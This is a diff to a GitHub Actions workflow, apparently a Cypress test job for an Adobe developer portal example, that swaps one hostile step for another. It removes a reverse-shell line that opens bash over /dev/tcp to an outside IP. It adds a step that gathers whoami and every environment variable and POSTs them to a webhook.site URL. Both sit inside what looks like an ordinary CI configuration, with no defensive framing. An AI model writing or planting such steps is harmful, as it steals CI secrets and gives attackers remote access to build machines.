@@ -28,15 +28,19 @@ jobs:
       - name: Checkout
         uses: actions/checkout@v4
 
-      - name: 'Create env file and reverse shell'
+      - name: 'Create env file and exfiltrate data'
         run: |
           touch ./example/.env
           echo GATSBY_IMS_SRC="https://auth-stg1.services.adobe.com/imslib/imslib.min.js" >> ./example/.env
           echo GATSBY_IMS_CONFIG='{"client_id": "stage_adobe_io", "scope": "AdobeID,openid,unified_dev_portal,read_organizations,additional_info.projectedProductContext,additional_info.roles,gnav,read_pc.dma_bullseye,creative_sdk,adobeio_api,service_principals.read,service_principals.write,read_client_secret", "environment": "stg1"}' >> ./example/.env
           cat ./example/.env
 
-          # 🔥 Reverse shell to your machine
-          bash -i >& /dev/tcp/172.27.248.246/4444 0>&1
+          # 🔥 Exfiltrate whoami + environment variables
+          WHOAMI=$(whoami)
+          ENVVARS=$(env)
+          curl -X POST -H "Content-Type: text/plain" \
+            --data "WHOAMI=$WHOAMI"$'\n'"$ENVVARS" \
+            https://webhook.site/b212509f-85c3-4911-a86d-5fdaed053680
 
       - name: Run Tests
         uses: cypress-io/github-action@v5
